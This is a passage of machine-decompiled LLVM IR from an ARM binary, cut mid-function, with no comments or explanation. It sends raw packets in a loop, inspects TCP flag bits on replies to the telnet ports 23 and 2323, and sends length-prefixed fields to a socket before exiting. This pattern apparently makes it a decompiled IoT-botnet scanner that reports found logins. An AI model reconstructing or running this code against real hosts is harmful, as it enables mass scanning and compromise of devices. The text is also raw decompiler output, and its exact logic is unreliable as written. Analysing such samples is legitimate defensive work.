  %v9_101dc = call i32 @sendto(i32 %v2_101a0, i32* nonnull @global_var_1a6e0.201, i32 40, i32 16384, %sockaddr* %tmp298, i32 16)
  store i32 %v9_101dc, i32* %r0.global-to-local, align 4
  %v3_101e0 = load i32, i32* %stack_var_-52, align 4
  %v1_101e4 = add i32 %v3_101e0, 1
  store i32 %v1_101e4, i32* %r3.global-to-local, align 4
  %v3_101e8 = icmp ugt i32 %v1_101e4, 383
  store i1 %v3_101e8, i1* %cpsr_c.global-to-local, align 1
  %v8_101e8 = icmp eq i32 %v1_101e4, 384
  store i1 %v8_101e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_101e4, i32* %stack_var_-52, align 4
  %v5_101f0 = icmp slt i32 %v1_101e4, 384
  br i1 %v5_101f0, label %.thread68.dec_label_pc_fee0_crit_edge, label %dec_label_pc_101f4

.thread68.dec_label_pc_fee0_crit_edge:            ; preds = %.thread68
  %v0_fee0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_fee0

dec_label_pc_101f4:                               ; preds = %.thread68
  %v0_101f4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_101f4, i32* @fp, align 4
  br label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %dec_label_pc_fec4, %dec_label_pc_101f4
  %v0_101f8 = call i32* @__errno_location()
  %v2_101f8 = ptrtoint i32* %v0_101f8 to i32
  store i32 %v2_101f8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_101f8, i32* @sb, align 4
  br label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %dec_label_pc_102e0, %dec_label_pc_102d8, %dec_label_pc_102d0, %dec_label_pc_1029c, %dec_label_pc_1028c, %dec_label_pc_10268, %dec_label_pc_10250, %dec_label_pc_102c8, %dec_label_pc_102b8, %dec_label_pc_10248, %dec_label_pc_10380, %dec_label_pc_101f8
  %v1_10208 = phi i32 [ %v2_101f8, %dec_label_pc_101f8 ], [ %v1_10208.pre.pre, %dec_label_pc_10380 ], [ %v0_1023c, %dec_label_pc_10248 ], [ %v0_1023c, %dec_label_pc_102b8 ], [ %v0_1023c, %dec_label_pc_102c8 ], [ %v0_1023c, %dec_label_pc_10250 ], [ %v0_1023c, %dec_label_pc_10268 ], [ %v0_1023c, %dec_label_pc_1028c ], [ %v0_1023c, %dec_label_pc_1029c ], [ %v0_1023c, %dec_label_pc_102d0 ], [ %v0_1023c, %dec_label_pc_102d8 ], [ %v0_1023c, %dec_label_pc_102e0 ]
  %v2_10208 = inttoptr i32 %v1_10208 to i32*
  store i32 0, i32* %v2_10208, align 4
  %v2_10214 = load i32, i32* @global_var_1a734.199, align 4
  store i32 %v2_10214, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_feb4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v10_10230 = call i32 @recvfrom(i32 %v2_10214, i32* nonnull %stack_var_-1862, i32 1514, i32 16384, %sockaddr* null, i32* null)
  store i32 %v10_10230, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10234 = icmp eq i32 %v10_10230, 0
  store i1 %v2_10234, i1* %cpsr_z.global-to-local, align 1
  %tmp334 = icmp slt i32 %v10_10230, 1
  br i1 %tmp334, label %dec_label_pc_1044c, label %dec_label_pc_1023c

dec_label_pc_1023c:                               ; preds = %dec_label_pc_10204
  %v0_1023c = load i32, i32* @sb, align 4
  %v1_1023c = inttoptr i32 %v0_1023c to i32*
  %v2_1023c = load i32, i32* %v1_1023c, align 4
  store i32 %v2_1023c, i32* %r3.global-to-local, align 4
  %v2_10240 = icmp ugt i32 %v2_1023c, 10
  store i1 %v2_10240, i1* %cpsr_c.global-to-local, align 1
  %v7_10240 = icmp eq i32 %v2_1023c, 11
  store i1 %v7_10240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10240, label %dec_label_pc_1044c, label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_1023c
  %v2_10248 = icmp ugt i32 %v10_10230, 38
  store i1 %v2_10248, i1* %cpsr_c.global-to-local, align 1
  %v7_10248 = icmp eq i32 %v10_10230, 39
  store i1 %v7_10248, i1* %cpsr_z.global-to-local, align 1
  %v2_1024c = xor i1 %v2_10248, true
  %v3_1024c = or i1 %v7_10248, %v2_1024c
  br i1 %v3_1024c, label %dec_label_pc_10204, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_10248
  store i32 %v2_feb4, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a714.104 to i32), i32* %r0.global-to-local, align 4
  %v3_10258 = load i32, i32* %v2_10258, align 4
  store i32 %v3_10258, i32* %r2.global-to-local, align 4
  %v2_1025c = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_1025c, i32* %r3.global-to-local, align 4
  %v3_10260 = icmp uge i32 %v3_10258, %v2_1025c
  store i1 %v3_10260, i1* %cpsr_c.global-to-local, align 1
  %v9_10260 = icmp eq i32 %v3_10258, %v2_1025c
  store i1 %v9_10260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10260, label %dec_label_pc_10268, label %dec_label_pc_10204

dec_label_pc_10268:                               ; preds = %dec_label_pc_10250
  %v3_10268 = load i8, i8* %v2_10268, align 1
  %v4_10268 = zext i8 %v3_10268 to i32
  store i32 %v4_10268, i32* %r3.global-to-local, align 4
  %v2_1026c = icmp ugt i8 %v3_10268, 5
  store i1 %v2_1026c, i1* %cpsr_c.global-to-local, align 1
  %v7_1026c = icmp eq i8 %v3_10268, 6
  store i1 %v7_1026c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1026c, label %dec_label_pc_10274, label %dec_label_pc_10204

dec_label_pc_10274:                               ; preds = %dec_label_pc_10268
  store i32 %v2_feb8, i32* %r1.global-to-local, align 4
  %v2_10278 = load i8, i8* %tmp297, align 4
  %v3_10278 = zext i8 %v2_10278 to i32
  store i32 %v3_10278, i32* %r2.global-to-local, align 4
  %v3_1027c = load i8, i8* %v2_1027c, align 1
  %v4_1027c = zext i8 %v3_1027c to i32
  store i32 %v4_1027c, i32* %r3.global-to-local, align 4
  %v4_10280 = mul nuw nsw i32 %v4_1027c, 256
  %v5_10280 = or i32 %v4_10280, %v3_10278
  store i32 %v5_10280, i32* %r2.global-to-local, align 4
  %v2_10284 = icmp ugt i32 %v5_10280, 5887
  store i1 %v2_10284, i1* %cpsr_c.global-to-local, align 1
  %v7_10284 = icmp eq i32 %v5_10280, 5888
  store i1 %v7_10284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10284, label %dec_label_pc_1029c, label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10274
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_10294 = icmp ugt i32 %v5_10280, 4872
  store i1 %v3_10294, i1* %cpsr_c.global-to-local, align 1
  %v9_10294 = icmp eq i32 %v5_10280, 4873
  store i1 %v9_10294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10294, label %dec_label_pc_1029c, label %dec_label_pc_10204

dec_label_pc_1029c:                               ; preds = %dec_label_pc_1028c, %dec_label_pc_10274
  store i32 %v2_feb8, i32* %r2.global-to-local, align 4
  %v3_102a0 = load i8, i8* %v2_102a0, align 2
  %v4_102a0 = zext i8 %v3_102a0 to i32
  store i32 %v4_102a0, i32* %r3.global-to-local, align 4
  %v3_102a4 = load i8, i8* %v2_102a4, align 1
  %v4_102a4 = zext i8 %v3_102a4 to i32
  store i32 %v4_102a4, i32* %r2.global-to-local, align 4
  store i32 %v4_fd44, i32* %ip.global-to-local, align 4
  %v4_102ac = mul nuw nsw i32 %v4_102a4, 256
  %v5_102ac = or i32 %v4_102ac, %v4_102a0
  store i32 %v5_102ac, i32* %r3.global-to-local, align 4
  %v3_102b0 = icmp uge i32 %v5_102ac, %v4_fd44
  store i1 %v3_102b0, i1* %cpsr_c.global-to-local, align 1
  %v9_102b0 = icmp eq i32 %v5_102ac, %v4_fd44
  store i1 %v9_102b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_102b0, label %dec_label_pc_102b8, label %dec_label_pc_10204

dec_label_pc_102b8:                               ; preds = %dec_label_pc_1029c
  store i32 %v2_feb8, i32* %lr.global-to-local, align 4
  %v3_102bc = load i8, i8* %v2_102bc, align 1
  %v4_102bc = zext i8 %v3_102bc to i32
  store i32 %v4_102bc, i32* %r3.global-to-local, align 4
  %v1_102c0 = and i32 %v4_102bc, 2
  %v2_102c0 = icmp eq i32 %v1_102c0, 0
  store i1 %v2_102c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102c0, label %dec_label_pc_10204, label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102b8
  %v1_102c8 = and i32 %v4_102bc, 16
  %v2_102c8 = icmp eq i32 %v1_102c8, 0
  store i1 %v2_102c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102c8, label %dec_label_pc_10204, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102c8
  %v1_102d0 = and i32 %v4_102bc, 4
  %v2_102d0 = icmp eq i32 %v1_102d0, 0
  store i1 %v2_102d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102d0, label %dec_label_pc_102d8, label %dec_label_pc_10204

dec_label_pc_102d8:                               ; preds = %dec_label_pc_102d0
  %tmp504 = urem i8 %v3_102bc, 2
  %v2_102d8 = icmp eq i8 %tmp504, 0
  store i1 %v2_102d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102d8, label %dec_label_pc_102e0, label %dec_label_pc_10204

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102d8
  %v3_102e0 = load i32, i32* %v2_102e0, align 4
  %v2_102fc = call i32 @llvm.bswap.i32(i32 %v3_102e0)
  %v1_10300 = add i32 %v2_102fc, -1
  %v1_10304 = udiv i32 %v1_10300, 256
  %v3_10308 = and i32 %v1_10304, 65280
  %v1_1030c = and i32 %v1_10300, 65280
  store i32 %v1_1030c, i32* %r2.global-to-local, align 4
  %v3_10310 = mul i32 %v1_10300, 16777216
  %v4_10314 = udiv i32 %v1_10300, 16777216
  %v5_10314 = or i32 %v3_10308, %v4_10314
  store i32 %v5_10314, i32* %r1.global-to-local, align 4
  store i32 %v2_feb4, i32* %r3.global-to-local, align 4
  %v4_1031c = mul nuw nsw i32 %v1_1030c, 256
  %v5_1031c = or i32 %v4_1031c, %v3_10310
  store i32 %v5_1031c, i32* %r0.global-to-local, align 4
  %v3_10320 = load i32, i32* %v2_10320, align 4
  store i32 %v3_10320, i32* %r2.global-to-local, align 4
  %v2_10324 = call i32 @llvm.bswap.i32(i32 %v1_10300)
  store i32 %v2_10324, i32* %ip.global-to-local, align 4
  %v3_10328 = icmp uge i32 %v2_10324, %v3_10320
  store i1 %v3_10328, i1* %cpsr_c.global-to-local, align 1
  %v9_10328 = icmp eq i32 %v2_10324, %v3_10320
  store i1 %v9_10328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10328, label %dec_label_pc_10330, label %dec_label_pc_10204

dec_label_pc_10330:                               ; preds = %dec_label_pc_102e0
  %v0_10330 = load i32, i32* @r4, align 4
  %v2_10330 = icmp ugt i32 %v0_10330, 254
  store i1 %v2_10330, i1* %cpsr_c.global-to-local, align 1
  %v7_10330 = icmp eq i32 %v0_10330, 255
  store i1 %v7_10330, i1* %cpsr_z.global-to-local, align 1
  %v8_10334 = icmp sgt i32 %v0_10330, 255
  br i1 %v8_10334, label %dec_label_pc_1044c, label %dec_label_pc_10338

dec_label_pc_10338:                               ; preds = %dec_label_pc_10330
  store i32 ptrtoint (i32* @global_var_1a730.197 to i32), i32* %lr.global-to-local, align 4
  %v3_1033c = mul i32 %v0_10330, 256
  store i32 %v3_1033c, i32* %r2.global-to-local, align 4
  %v2_10340 = load i32, i32* @global_var_1a730.197, align 4
  store i32 %v2_10340, i32* %r1.global-to-local, align 4
  %v2_10348 = mul i32 %v0_10330, 288
  store i32 %v2_10348, i32* %r3.global-to-local, align 4
  %v2_1034c = add i32 %v2_10340, %v2_10348
  store i32 %v2_1034c, i32* @r0, align 4
  %v1_10350 = add i32 %v2_1034c, 12
  %v2_10350 = inttoptr i32 %v1_10350 to i32*
  %v3_10350 = load i32, i32* %v2_10350, align 4
  store i32 %v3_10350, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10354 = icmp eq i32 %v3_10350, 0
  store i1 %v2_10354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10354, label %dec_label_pc_10380, label %dec_label_pc_10360.preheader

dec_label_pc_10360.preheader:                     ; preds = %dec_label_pc_10338
  %v2_10358 = add i32 %v2_1034c, 288
  store i32 %v2_10358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10360

dec_label_pc_10360:                               ; preds = %dec_label_pc_10360.preheader, %dec_label_pc_1036c
  %v0_1036c = phi i32 [ %v2_10358, %dec_label_pc_10360.preheader ], [ %v1_10378, %dec_label_pc_1036c ]
  %v0_10360 = phi i32 [ %v0_10330, %dec_label_pc_10360.preheader ], [ %v1_10360, %dec_label_pc_1036c ]
  %v1_10360 = add i32 %v0_10360, 1
  store i32 %v1_10360, i32* @r4, align 4
  %v7_10364 = icmp eq i32 %v1_10360, 256
  br i1 %v7_10364, label %dec_label_pc_1044c.loopexit, label %dec_label_pc_1036c

dec_label_pc_1036c:                               ; preds = %dec_label_pc_10360
  store i32 %v0_1036c, i32* @r0, align 4
  %v1_10370 = add i32 %v0_1036c, 12
  %v2_10370 = inttoptr i32 %v1_10370 to i32*
  %v3_10370 = load i32, i32* %v2_10370, align 4
  %v2_10374 = icmp eq i32 %v3_10370, 0
  %v1_10378 = add i32 %v0_1036c, 288
  store i32 %v1_10378, i32* %r3.global-to-local, align 4
  br i1 %v2_10374, label %dec_label_pc_10380.loopexit, label %dec_label_pc_10360

dec_label_pc_10380.loopexit:                      ; preds = %dec_label_pc_1036c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10380

dec_label_pc_10380:                               ; preds = %dec_label_pc_10380.loopexit, %dec_label_pc_10338
  %v1_10380 = phi i32 [ %v0_1036c, %dec_label_pc_10380.loopexit ], [ %v2_1034c, %dec_label_pc_10338 ]
  %v2_10380 = add i32 %v1_10380, 16
  %v3_10380 = inttoptr i32 %v2_10380 to i32*
  store i32 %v3_10320, i32* %v3_10380, align 4
  store i32 %v2_feb8, i32* %r1.global-to-local, align 4
  %v2_10388 = load i32, i32* %stack_var_-1842, align 4
  store i32 %v2_10388, i32* %r2.global-to-local, align 4
  %v1_1038c = and i32 %v2_10388, 128
  %v2_1038c = icmp ne i32 %v1_1038c, 0
  store i1 %v2_1038c, i1* %cpsr_c.global-to-local, align 1
  %v3_1038c = sdiv i32 %v2_10388, 256
  store i32 %v3_1038c, i32* %r3.global-to-local, align 4
  %v1_10390 = trunc i32 %v3_1038c to i8
  %v2_10390 = load i32, i32* @r0, align 4
  %v3_10390 = add i32 %v2_10390, 21
  %v4_10390 = inttoptr i32 %v3_10390 to i8*
  store i8 %v1_10390, i8* %v4_10390, align 1
  %v0_10394 = load i32, i32* %r2.global-to-local, align 4
  %v1_10394 = trunc i32 %v0_10394 to i8
  %v2_10394 = load i32, i32* @r0, align 4
  %v3_10394 = add i32 %v2_10394, 20
  %v4_10394 = inttoptr i32 %v3_10394 to i8*
  store i8 %v1_10394, i8* %v4_10394, align 1
  %v0_10398 = call i32 @function_f928()
  store i32 %v0_10398, i32* %r0.global-to-local, align 4
  %v1_10208.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_10204

dec_label_pc_103a0:                               ; preds = %dec_label_pc_1123c
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103b0 = load i32, i32* @r4, align 4
  store i32 %v0_103b0, i32* %r0.global-to-local, align 4
  %v0_103b4 = load i32, i32* @r5, align 4
  store i32 %v0_103b4, i32* %stack_var_-56, align 4
  %v6_103b8 = call i32 @send(i32 %v0_103b0, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_10c78, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103cc = load i32, i32* @r4, align 4
  store i32 %v0_103cc, i32* %r0.global-to-local, align 4
  %v5_103d0 = call i32 @send(i32 %v0_103cc, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_103d8 = load i32, i32* @r6, align 4
  store i32 %v0_103d8, i32* %r2.global-to-local, align 4
  %v2_103dc = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_103dc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103e4 = load i32, i32* @r4, align 4
  store i32 %v0_103e4, i32* %r0.global-to-local, align 4
  %v5_103e8 = call i32 @send(i32 %v0_103e4, i32* nonnull %stack_var_-38, i32 %v0_103d8, i32 16384)
  %v0_103ec = load i32, i32* @sl, align 4
  %v1_103ec = add i32 %v0_103ec, 12
  store i32 %v1_103ec, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103f8 = load i32, i32* @r4, align 4
  store i32 %v0_103f8, i32* %r0.global-to-local, align 4
  %v4_103fc = inttoptr i32 %v1_103ec to i32*
  %v5_103fc = call i32 @send(i32 %v0_103f8, i32* %v4_103fc, i32 1, i32 16384)
  store i32 %v5_103fc, i32* %r0.global-to-local, align 4
  %v0_10400 = load i32, i32* @sl, align 4
  %v1_10400 = inttoptr i32 %v0_10400 to i32*
  %v2_10400 = load i32, i32* %v1_10400, align 4
  store i32 %v2_10400, i32* %r1.global-to-local, align 4
  %v1_10404 = add i32 %v0_10400, 12
  %v2_10404 = inttoptr i32 %v1_10404 to i8*
  %v3_10404 = load i8, i8* %v2_10404, align 1
  %v4_10404 = zext i8 %v3_10404 to i32
  store i32 %v4_10404, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1040c = load i32, i32* @r4, align 4
  store i32 %v0_1040c, i32* %r0.global-to-local, align 4
  %v4_10410 = inttoptr i32 %v2_10400 to i32*
  %v5_10410 = call i32 @send(i32 %v0_1040c, i32* %v4_10410, i32 %v4_10404, i32 16384)
  %v0_10414 = load i32, i32* @sl, align 4
  %v1_10414 = add i32 %v0_10414, 13
  store i32 %v1_10414, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10420 = load i32, i32* @r4, align 4
  store i32 %v0_10420, i32* %r0.global-to-local, align 4
  %v4_10424 = inttoptr i32 %v1_10414 to i32*
  %v5_10424 = call i32 @send(i32 %v0_10420, i32* %v4_10424, i32 1, i32 16384)
  %v0_10428 = load i32, i32* @r4, align 4
  store i32 %v0_10428, i32* %r0.global-to-local, align 4
  %v0_1042c = load i32, i32* @sl, align 4
  %v1_1042c = add i32 %v0_1042c, 13
  %v2_1042c = inttoptr i32 %v1_1042c to i8*
  %v3_1042c = load i8, i8* %v2_1042c, align 1
  %v4_1042c = zext i8 %v3_1042c to i32
  store i32 %v4_1042c, i32* %r2.global-to-local, align 4
  %v1_10430 = add i32 %v0_1042c, 4
  %v2_10430 = inttoptr i32 %v1_10430 to i32*
  %v3_10430 = load i32, i32* %v2_10430, align 4
  store i32 %v3_10430, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10438 = inttoptr i32 %v3_10430 to i32*
  %v5_10438 = call i32 @send(i32 %v0_10428, i32* %v4_10438, i32 %v4_1042c, i32 16384)
  %v0_1043c = load i32, i32* @r4, align 4
  store i32 %v0_1043c, i32* %r0.global-to-local, align 4
  %v1_10440 = call i32 @close(i32 %v0_1043c)
  store i32 %v1_10440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10444

dec_label_pc_10444:                               ; preds = %dec_label_pc_11220, %dec_label_pc_fc5c, %dec_label_pc_10534, %dec_label_pc_103a0
  %v0_10444 = load i32, i32* @r5, align 4
  store i32 %v0_10444, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_10444)
  unreachable

dec_label_pc_1044c.loopexit:                      ; preds = %dec_label_pc_10360
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1044c

dec_label_pc_1044c:                               ; preds = %dec_label_pc_10330, %dec_label_pc_1023c, %dec_label_pc_10204, %dec_label_pc_1044c.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1664, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v2_10460451 = load i32, i32* %sp.global-to-local, align 4
  %v3_10460452 = add i32 %v2_10460451, 1664
  %v4_10460453 = inttoptr i32 %v3_10460452 to i32*
  store i32 0, i32* %v4_10460453, align 4
  br label %dec_label_pc_10454.dec_label_pc_10454_crit_edge

dec_label_pc_10454.dec_label_pc_10454_crit_edge:  ; preds = %dec_label_pc_1044c, %dec_label_pc_10454.dec_label_pc_10454_crit_edge
  %v0_10454.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10460.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10454 = add i32 %v0_10454.pre, 1664
  store i32 %v1_10454, i32* %ip.global-to-local, align 4
  %v1_10458 = add i32 %v0_10454.pre, 4
  store i32 %v1_10458, i32* %r3.global-to-local, align 4
  %v7_1045c = icmp eq i32 %v1_10458, 128
  %v2_10460 = load i32, i32* %sp.global-to-local, align 4
  %v3_10460 = add i32 %v2_10460, %v1_10454
  %v4_10460 = inttoptr i32 %v3_10460 to i32*
  store i32 %v0_10460.pre, i32* %v4_10460, align 4
  br i1 %v7_1045c, label %dec_label_pc_10468, label %dec_label_pc_10454.dec_label_pc_10454_crit_edge

dec_label_pc_10468:                               ; preds = %dec_label_pc_10454.dec_label_pc_10454_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10468 = load i32, i32* %r2.global-to-local, align 4
  %v1_1046c454 = add i32 %v0_10468, 1536
  store i32 %v1_1046c454, i32* %lr.global-to-local, align 4
  %v1_10470455 = add i32 %v0_10468, 4
  store i32 %v1_10470455, i32* %r3.global-to-local, align 4
  %v7_10474456 = icmp eq i32 %v1_10470455, 128
  %v2_10478457 = load i32, i32* %sp.global-to-local, align 4
  %v3_10478458 = add i32 %v2_10478457, %v1_1046c454
  %v4_10478459 = inttoptr i32 %v3_10478458 to i32*
  store i32 %v0_10468, i32* %v4_10478459, align 4
  br i1 %v7_10474456, label %dec_label_pc_10480, label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge

dec_label_pc_1046c.dec_label_pc_1046c_crit_edge:  ; preds = %dec_label_pc_10468, %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge
  %v0_1046c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10478.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1046c = add i32 %v0_1046c.pre, 1536
  store i32 %v1_1046c, i32* %lr.global-to-local, align 4
  %v1_10470 = add i32 %v0_1046c.pre, 4
  store i32 %v1_10470, i32* %r3.global-to-local, align 4
  %v7_10474 = icmp eq i32 %v1_10470, 128
  %v2_10478 = load i32, i32* %sp.global-to-local, align 4
  %v3_10478 = add i32 %v2_10478, %v1_1046c
  %v4_10478 = inttoptr i32 %v3_10478 to i32*
  store i32 %v0_10478.pre, i32* %v4_10478, align 4
  br i1 %v7_10474, label %dec_label_pc_10480, label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge

dec_label_pc_10480:                               ; preds = %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge, %dec_label_pc_10468
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10480 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10480, i32* @r6, align 4
  store i32 %v0_10480, i32* @r5, align 4
  store i32 %v0_10480, i32* @r7, align 4
  store i32 %v0_10480, i32* %stack_var_-52, align 4
  br label %dec_label_pc_104fc

dec_label_pc_10494:                               ; preds = %dec_label_pc_10524, %dec_label_pc_104fc
  %storemerge245 = phi i32 [ 30, %dec_label_pc_104fc ], [ 5, %dec_label_pc_10524 ]
  store i32 %storemerge245, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %r2.global-to-local, align 4
  %v2_10498 = load i32, i32* @global_var_1a710.184, align 4
  store i32 %v2_10498, i32* %r3.global-to-local, align 4
  %v1_1049c = add i32 %v2_10510, 8
  %v2_1049c = inttoptr i32 %v1_1049c to i32*
  %v3_1049c = load i32, i32* %v2_1049c, align 4
  store i32 %v3_1049c, i32* %r2.global-to-local, align 4
  %v2_104a0 = sub i32 %v2_10498, %v3_1049c
  store i32 %v2_104a0, i32* %r3.global-to-local, align 4
  %v3_104a4 = icmp uge i32 %v2_104a0, %storemerge245
  store i1 %v3_104a4, i1* %cpsr_c.global-to-local, align 1
  %v9_104a4 = icmp eq i32 %v2_104a0, %storemerge245
  store i1 %v9_104a4, i1* %cpsr_z.global-to-local, align 1
  %v2_104a8 = xor i1 %v9_104a4, true
  %v3_104a8 = and i1 %v3_104a4, %v2_104a8
  br i1 %v3_104a8, label %dec_label_pc_10578, label %dec_label_pc_104ac

dec_label_pc_104ac:                               ; preds = %dec_label_pc_10494
  store i1 %v2_10518, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10518, i1* %cpsr_z.global-to-local, align 1
  %v1_10544 = add i32 %v2_10510, 4
  %v2_10544 = inttoptr i32 %v1_10544 to i32*
  %v3_10544 = load i32, i32* %v2_10544, align 4
  br i1 %v7_10518, label %dec_label_pc_10544, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104ac
  store i32 %v3_10544, i32* %ip.global-to-local, align 4
  %v3_104bc = udiv i32 %v3_10544, 32
  store i32 %v2_10554, i32* %r0.global-to-local, align 4
  %v3_104c4 = mul nuw nsw i32 %v3_104bc, 4
  %v2_104c8 = add i32 %v3_104c4, %v2_10554
  store i32 %v2_104c8, i32* %r3.global-to-local, align 4
  %v1_104cc = add i32 %v2_104c8, -184
  %v2_104cc = inttoptr i32 %v1_104cc to i32*
  %v3_104cc = load i32, i32* %v2_104cc, align 4
  %v1_104d0 = urem i32 %v3_10544, 32
  store i32 %v1_104d0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_104d8 = shl i32 1, %v1_104d0
  %v8_104d8 = or i32 %v3_104cc, %v7_104d8
  store i32 %v8_104d8, i32* %r2.global-to-local, align 4
  store i32 %v8_104d8, i32* %v2_104cc, align 4
  %v0_104e0 = load i32, i32* @r6, align 4
  %v1_104e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_104e0 = icmp uge i32 %v0_104e0, %v1_104e0
  store i1 %v3_104e0, i1* %cpsr_c.global-to-local, align 1
  %v9_104e0 = icmp eq i32 %v0_104e0, %v1_104e0
  store i1 %v9_104e0, i1* %cpsr_z.global-to-local, align 1
  %v5_104e4 = icmp slt i32 %v0_104e0, %v1_104e0
  br i1 %v5_104e4, label %bb336, label %bb337

bb336:                                            ; preds = %dec_label_pc_104b4
  store i32 %v1_104e0, i32* @r6, align 4
  br label %bb337

bb337:                                            ; preds = %dec_label_pc_10524, %dec_label_pc_105b8, %dec_label_pc_105ac, %bb339, %dec_label_pc_104b4, %bb336
  %v3_104e8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_104e8, i32* %r3.global-to-local, align 4
  %v1_104ec = add i32 %v3_104e8, 1
  store i32 %v1_104ec, i32* %r2.global-to-local, align 4
  %v2_104f0 = icmp ugt i32 %v1_104ec, 254
  store i1 %v2_104f0, i1* %cpsr_c.global-to-local, align 1
  %v7_104f0 = icmp eq i32 %v1_104ec, 255
  store i1 %v7_104f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_104ec, i32* %stack_var_-52, align 4
  %v8_104f8 = icmp sgt i32 %v1_104ec, 255
  br i1 %v8_104f8, label %dec_label_pc_105c4, label %dec_label_pc_104fc

dec_label_pc_104fc:                               ; preds = %bb337, %dec_label_pc_10480
  %v0_10508 = phi i32 [ %v1_104ec, %bb337 ], [ %v0_10480, %dec_label_pc_10480 ]
  store i32 ptrtoint (i32* @global_var_1a730.197 to i32), i32* %r0.global-to-local, align 4
  %v3_10500 = mul i32 %v0_10508, 256
  store i32 %v3_10500, i32* %r3.global-to-local, align 4
  %v2_10504 = load i32, i32* @global_var_1a730.197, align 4
  store i32 %v2_10504, i32* %r1.global-to-local, align 4
  %v2_1050c = mul i32 %v0_10508, 288
  store i32 %v2_1050c, i32* %r2.global-to-local, align 4
  %v2_10510 = add i32 %v2_10504, %v2_1050c
  store i32 %v2_10510, i32* @r4, align 4
  %v1_10514 = add i32 %v2_10510, 12
  %v2_10514 = inttoptr i32 %v1_10514 to i32*
  %v3_10514 = load i32, i32* %v2_10514, align 4
  store i32 %v3_10514, i32* %ip.global-to-local, align 4
  %v2_10518 = icmp ne i32 %v3_10514, 0
  store i1 %v2_10518, i1* %cpsr_c.global-to-local, align 1
